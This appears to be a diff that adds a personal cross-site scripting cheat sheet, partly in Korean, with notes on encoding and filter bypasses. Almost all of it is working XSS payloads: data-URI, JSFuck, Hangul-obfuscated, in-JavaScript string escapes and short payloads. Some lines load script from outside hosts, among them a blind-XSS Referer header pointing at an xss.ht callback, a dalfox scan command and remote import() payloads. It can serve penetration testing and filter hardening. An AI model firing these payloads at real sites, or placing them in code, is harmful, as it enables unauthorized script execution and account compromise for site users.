@@ -1,0 +1,469 @@
+Referer: asd'"><script src="//hahwul.xss.ht"></script>
+
+dalfox url https://google.com?q=1234 -b hahwul.xss.ht
+----------------------------------------------------------------
+MS XSS
+
+<math>
+	<mtext>
+	<table>
+	<mglyph>
+	<style><!--</style>
+	<img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
+
+
+chrome
+  <math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
+  ----------------------------------------------------------------
+
+    ----------------------------------------------------------------
+Bypass protection
+Basic mechanism
+XSS의 우회 기술은 대부분 웹과 브라우저의 정책, 그리고 개발자가 의도한 추가적인 기능들을 이용해 이루어집니다. 각종 인코딩부터 특수한 문자 셋, 그리고 기존 XSS 보호 로직을 역이용한 방법 등 매우 많으며, 이는 기본적으로 서비스에서 Input을 어떻게 받고 처리하느냐를 중점적으로 생각 해야합니다. 딱 정해진 방법이 있는게 아니라서 한번 더 생각해보고 고민해보는 습관을 가져야 잘 풀어나갈 수 있습니다.
+
+아래는 아주 기본적인 우회 방법들이니 참고하시길 바래요.
+
+  URL Encoding
+%3C ⇒ <
+%3E ⇒ >
+%22 ⇒ "
+%27 ⇒ '
+등 URL Encode를 이용한 우회기법입니다. 처리하는 앱에 따라서 여러번 Encode하여 우회하는 경우도 있습니다.
+
+%253C
+%253E
+%2522
+%2527
+%25253C
+%25253E
+%252522
+%252527
+
+
+  GET /?title=%26%23x003C;script%26%23x003E;alert(45)%26%23x003C;/script%26%23x003E;
+
+Copy
+&#x003c ⇒ <
+&#x003e ⇒ >
+&#x0022 ⇒ "
+&#x0027 ⇒ '
+Unicode Encoding
+\u003c ⇒ <
+\u003e ⇒ >
+\u0022 ⇒ "
+\u0027 ⇒ '
+GBK Encoding
+嘾 = %E5%98%BE = \u563e ⇒ %3E >
+嘼 = %E5%98%BC = \u563c ⇒ %3C <
+嘢 = %E5%98%A2 = \u5622 ⇒ %22 '
+嘧 = %E5%98%A7 = \u5627 ⇒ %27 "
+Bypass domain check protection
+<script src="data://www.trustdomain.hahwul.com, alert(45)"></script>
+
+
+Hidden XSS
+https://www.hahwul.com/2016/12/28/web-hacking-html-accesskey-and-hidden/
+https://www.hahwul.com/2016/06/20/web-hacking-hiddenxss-xss-in-hidden/
+https://www.hahwul.com/2024/07/29/hidden-xss-no-user-interaction/
+<!-- None interaction Hidden XSS -->
+<input type="hidden" oncontentvisibilityautostatechange="alert(/ChromeCanary/)" style="content-visibility:auto">
+
+Copy
+<html>
+<body>
+  <input type="hidden" accesskey="X" onclick="alert(45)">
+</body>
+</html>
+
+Copy
+<button popovertarget=×>Click me</button>
+<input type="hidden" value="y" popover id=x onbeforetoggle=alert(1)>
+
+Copy
+Data URI XSS
+https://www.hahwul.com/2022/03/05/data-uri-xss-v2/
+https://www.hahwul.com/2017/03/15/web-hacking-data-xss-filtering-bypass/
+<script src="data:;base64,YWxlcnQoMSk="></script>
+<iframe src="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+"></iframe>
+<object data='data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+'></object>
+<embed src="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+"></embed>
+<form action="data:text/html;charset=utf-8,%3cbr%3e"><input type='submit'></form>
+<a href="data:text/html;,<br>">x</a>
+<meta HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCg0NSk8L3NjcmlwdD4=">
+
+Copy
+JSFuck
+https://www.hahwul.com/2018/09/15/jsfuck-xss-payload/
+https://github.com/aemkei/jsfuck/blob/master/jsfuck.js
+// alert(1)
+this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]](++[[]][+[]])
+
+// alert(1)
+this[(+{}+[])[-~[]]+(![]+[])[-~-~[]]+([][+[]]+[])[-~-~-~[]]+(!![]+[])[-~[]]+(!![]+[])[+[]]]((-~[]+[]))
+
+Copy
+JSFuck+Hangul
+https://www.hahwul.com/2018/11/20/waf-bypass-xss-payload-only-hangul/
+https://twitter.com/XssPayloads/status/1095213323677782017
+<html>
+  <head>
+    <meta charset="utf-8">
+  </head>
+<script>
+([,하,,,,훌]=[]+{},[한,글,페,이,,로,드,ㅋ,,,ㅎ]=[!!하]+!하+하.ㅁ)
+[훌+=하+ㅎ+ㅋ+한+글+페+훌+한+하+글][훌](로+드+이+글+한+'(45)')()
+</script>
+</html>
+
+Copy
+JSFuck+8
+[]["\146\151\154\164\145\162"]["\143\157\156\163\164\162\165\143\164\157\162"]("\141\154\145\162\164\50\61\51")()
+
+Copy
+With strtoupper
+strtoupper(<ſcript>) by Rubiya
+
+%c4%b1 : "ı".toUpperCase() == "I"
+%c5%bf : "ſ".toUpperCase() == "S"
+%c4%b0 : "İ".toLowerCase() == "i"
+%E2%84%AA : "K".toLowerCase() == "k"
+
+Copy
+U+2029 XSS
+Paragraph Separator(U+2029) XSS
+
+#!@*%
+alert(1)
+
+Copy
+URI Hash XSS
+https://www.hahwul.com/2018/03/21/hacking-hsah-tag-xss-escape-quot-with/
+
+document.write("<img/src="+absolutizeUrl('http://www.hahwul.com#" onerror=alert(45)')+">");
+
+Copy
+xmp/noscript/noframes/iframe
+https://www.hahwul.com/2019/04/12/bypass-xss-protection-with-xmp-noscript-etc/
+
+<noscript><p title="</noscript><svg/onload=alert(45)>">
+<noframes><p title="</noframes><svg/onload=alert(45)>">
+<iframe><p title="</iframe><svg/onload=alert(45)>">
+<xmp><p title="</xmp><svg/onload=alert(45)>">
+
+Copy
+Normalized XSS
+https://www.hahwul.com/2019/09/26/normalized-stored-xss/
+
+=[̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕
+
+
+  Bypass in-JS
+with
+<!-- <script/
+
+<script>
+  var test = "injection <!-- <script/";
+</script>
+
+<img src="</script><script>alert(origin)</script>">
+
+Copy
+with
+</script>
+
+<script>
+  var test = "</script><svg/onload=alert(45)>"
+</script>
+
+Copy
+with double quot and plus
+<script>
+  var test = ""+alert(45)+""
+  // user input: "+alert(45)+"
+</script>
+
+Copy
+with backslash
+<script>
+  var test = "\", test1="+alert(45)//input2"
+  // Original: var test = "input1", test1="input2"
+  // user input1: \
+  // user input2: +alert(45)//
+</script>
+
+Copy
+Without X
+Ways to XSS without parentheses
+
+alert`45`
+document.location="javascript:alert%2845%29"
+onerror=alert;throw 45
+
+Copy
+x=new DOMMatrix;
+matrix=alert;
+x.a=45;
+location='javascript'+':'+x
+
+
+  Bypass Env
+Short XSS
+18 chars
+
+<script/src=//Ǌ.₨>
+
+Copy
+19 chars
+
+<x onclick=alert()>
+
+Copy
+23 chars
+
+<svg/onload=eval(name)>
+
+Copy
+25 chars
+
+<style/onload=eval(name)>
+
+Copy
+Combined XSS
+GET /target?name=<script>alert(1)/*&age=*/</script>
+
+Copy
+name: <script>alert(1)/*
+test: 1234
+ggg: bbbb
+age: */</script>
+
+
+
+  <meta HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCg0NSk8L3NjcmlwdD4=">
+
+  <embed SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxMCIgaGVpZ2h0PSIxMCIgaWQ9InhzcyI+PHNjcmlwdCB0eXBlPSJ0ZXh0L2VjbWFzY3JpcHQiPmFsZXJ0KDQ1KTs8L3NjcmlwdD48L3N2Zz4=" type="image/svg+xml" AllowScriptAccess="always">
+
+  <form action=data:text/html;charset=utf-8,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%34%35%29%3c%2f%73%63%72%69%70%74%3e>
+<input type=submit>
+</form>
+  
+  <object data="data:application/x-shockwave-flash;base64,
+RldTCSEAAABIAZAAZAAADAEARBEIAAAAQwIAAP9AAAAA"></object>
+ <!-- xss swf in Base64 data -->
+
+
+  data:[<mediatype>][;base64],<data>
+
+
+  Data URI in HTML Elements
+Anchor tag
+<a href="data:text/html;,<br>">x</a>
+
+Copy
+Form tag
+<form action="data:text/html;charset=utf-8,%3cbr%3e">
+<input type=submit>
+</form>
+
+Copy
+Embed tag
+<embed src="data:text/html;,<br>">
+
+Copy
+Object tag
+<object data="data:text/html;,<br>">
+
+Copy
+Meta tag
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCg0NSk8L3NjcmlwdD4=">
+
+
+data: + text/html
+<embed type="text/html" src="data:text/html;,<svg/onload=alert(45)>">
+<embed type="text/html" src="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoNDUpPg==">
+
+<object data="data:text/html;,<svg/onload=alert(45)>">
+<object data="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoNDUpPg==">
+
+Copy
+data: + image/svg+xml
+<embed type="image/svg+xml" src='data:image/svg+xml;,<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" x="0" y="0" width="10" height="10" id="xss"><script type="text/ecmascript">alert(45);</script></svg>'>
+<embed type="image/svg+xml" src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxMCIgaGVpZ2h0PSIxMCIgaWQ9InhzcyI+PHNjcmlwdCB0eXBlPSJ0ZXh0L2VjbWFzY3JpcHQiPmFsZXJ0KDQ1KTs8L3NjcmlwdD48L3N2Zz4=">
+
+<object data='data:image/svg+xml;,<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" x="0" y="0" width="10" height="10" id="xss"><script type="text/ecmascript">alert(45);</script></svg>'>
+<object data="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxMCIgaGVpZ2h0PSIxMCIgaWQ9InhzcyI+PHNjcmlwdCB0eXBlPSJ0ZXh0L2VjbWFzY3JpcHQiPmFsZXJ0KDQ1KTs8L3NjcmlwdD48L3N2Zz4=">
+
+Copy
+data: application/xml
+<embed type="application/xml" src="data:application/xml;,<hahwul:script xmlns:hahwul='http://www.w3.org/1999/xhtml'>prompt(45)</hahwul:script>">
+<embed type="application/xml" src="data:application/xml;base64,PGhhaHd1bDpzY3JpcHQgeG1sbnM6aGFod3VsPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1s
+Jz5wcm9tcHQoNDUpPC9oYWh3dWw6c2NyaXB0Pg==">
+
+<object data="data:application/xml;,<hahwul:script xmlns:hahwul='http://www.w3.org/1999/xhtml'>prompt(45)</hahwul:script>"></object>
+<object data="data:application/xml;base64,PGhhaHd1bDpzY3JpcHQgeG1sbnM6aGFod3VsPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1s
+Jz5wcm9tcHQoNDUpPC9oYWh3dWw6c2NyaXB0Pg=="></object>
+
+
+  <svg </onload ="1> (_=prompt,_(1)) "">
+
+<svg ^/onload =" alert(45) ">
+
+<svg &/onload =" alert(45) ">
+
+<svg */onload =" alert(45) ">
+
+<svg %/onload =" alert(45) ">
+
+<svg $/onload =" alert(45) ">
+
+<svg #/onload =" alert(45) ">
+
+<svg @/onload =" alert(45) ">
+
+<svg !/onload =" alert(45) ">
+
+<svg hahwul/onload =" alert(45) ">
+
+<iframe hahwul/src ="javascript:alert(45)">
+
+<iframe hahwul/onmouseover =" alert(45) " scr=z>
+
+<input hahwul/onfocus="alert(45)" autofocus>
+
+<img hahwul/onerror =" alert(45) " src=z>
+
+
+  자바스크립트 구간
+1> (_=prompt,_(1))
+
+두번째 포인트는 Javascript 코드 부분입니다.
+
+1> (_=prompt,_(1))
+
+Copy
+내용만 보면 1과 (_=prompt,_(1)) 를 비교합니다. 앞부분은 중요하지 않고 핵심이 되는 부분은 (_=prompt,_(1)) 인데요. 구문을 콘솔로 보니 _ 에 function이 들어갔네요. 결국은 _ 라는 변수에 prompt 함수를 넣고 _(1) 형태로 실행한 케이스입니다. 간단한 트릭이지만 코드단 필터링을 푸는데는 도움이 될 수 있습니다 :)
+
+_=prompt // _ => function prompt() {[native code]}
+_(1) // promtp(1)
+
+
+asd" onload="alert(45)" a="
+asd"%20onload="alert(45)
+
+<svg/onload=alert(45)>
+<iframe/src=javascript:alert(45)>
+void''??globalThis?.alert?.(...[0b1_0_1_0_0_1_1_1_0_0_1,],)
+
+<svg/onload=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)>
+<script>/*<script>*/alert(1)//</script>
+  
+<Img Src=//remote-xss-link OnLoad=import(src)>
+
+<Img Src=//X55.is OnLoad=import(src)>
+  
+<form action=data:text/html;charset=utf-8,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%34%35%29%3c%2f%73%63%72%69%70%74%3e>
+<input type=submit>
+</form>
+
+<script//src=data:,[45].some(alert)></script>
+< script/"<a"/src=data:=".<a,[45].some(alert)>
+<script/"<a"/src=data:=".<a,[45].some(alert)></script>
+<div onpointerover="alert(45)">this is onpointerover=alert(45)</div>
+
+<img src=data: onerror=alert&puncsp;(1)>
+<img src=data: onerror=alert&hairsp;(1)>
+<img src=data: onerror=alert&emsp;(1)>
+<img src=data: onerror=alert&emsp13;(1)>
+<a href="javascript:1&Hat;alert(1)">test</a>
+
+<a onclick="location.href='\&fjlig;avascript:alert(1337)'">go</a>
+<div data-toggle=tooltip data-html=true title='<script>alert(45)</script>'>
+<xmp><p title="</xmp><svg/onload=alert(45)>">
+<noscript><p title="</noscript><svg/onload=alert(45)>">
+<noframes><p title="</noframes><svg/onload=alert(45)>">
+<iframe><p title="</iframe><svg/onload=alert(45)>">
+
+<scr<script>ipt>alert(45)</scr<script>ipt>
+
+" onerror=document.loc(at)ion.href="www.hahwul.com"
+"+alert(45)+prompt("
+
+---------------------------------------------
+Attack
+Input1: <script>/*
+Input2: */alert(45);/*
+Input3: */</scrpit>
+Ouput: <script>/*
+---------------------------------------------
+  
+  
+\" onerror=alert(45)
+<sc%72ipt>alert(45)</script>
+&#x3c;script&#x3e;alert(45)&#x3c;/script&#x3e;
+
+
+이렇게 되었을 시 HTML 내에서 정상적으로 작동하지 않게 되어 XSS에 취약하지 않은 상태입니다. 그러나 공격자는 0 을 이용해서 여러가지 공격코드를 만들어 낼 수 있습니다.
+Input: &#x003c;script&#x003e;alert(45)&#x003c;/script&#x003e;
+Input: &#x00003c;script&#x00003e;alert(45)&#x00003c;/script&#x00003e;
+Input: &#x0000003c;script&#x0000003e;alert(45)&#x0000003c;/script&#x0000003e;
+Input: &#x000000003c;script&#x000000003e;alert(45)&#x000000003c;/script&#x000000003e;
+
+Ouput: <script>alert(45)</script>
+ <A HREF="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;    &#x34;&#x35;&#x29;">XSS</A>
+
+  
+@_zulln이 최근에 신기한 XSS 페이로드를 하나 공개했습니다.
+---------------------------------------------
+<script>
+  var test = "injection <!-- <script/";
+</script>
+
+<img src="</script><script>alert(origin)</script>">
+---------------------------------------------
+Bypass string area
+겸사겸사 자바스크립트 내부에서의 문자열 탈출 방법도 몇개 같이 써 봅니다.
+
+with
+<!-- <script/
+
+<script>
+  var test = "injection <!-- <script/";
+</script>
+
+<img src="</script><script>alert(origin)</script>">
+
+Copy
+with
+</script>
+
+
+ws://www.hahwul.com;"><svg/onload=alert(45)>
+resource://www.hahwul.com;"><svg/onload=alert(45)>
+
+
+
+
+<script>
+  var test = "</script><svg/onload=alert(45)>"
+</script>
+
+Copy
+with double quot and plus
+<script>
+  var test = ""+alert(45)+""
+  // user input: "+alert(45)+"
+</script>
+
+Copy
+with backslash
+<script>
+  var test = "\", test1="+alert(45)//input2"
+  // Original: var test = "input1", test1="input2"
+  // user input1: \
+  // user input2: +alert(45)//
+</script>
+
+Copy
+
+<x onclick=alert(1)>
+<b onkeyup=alert(1)>
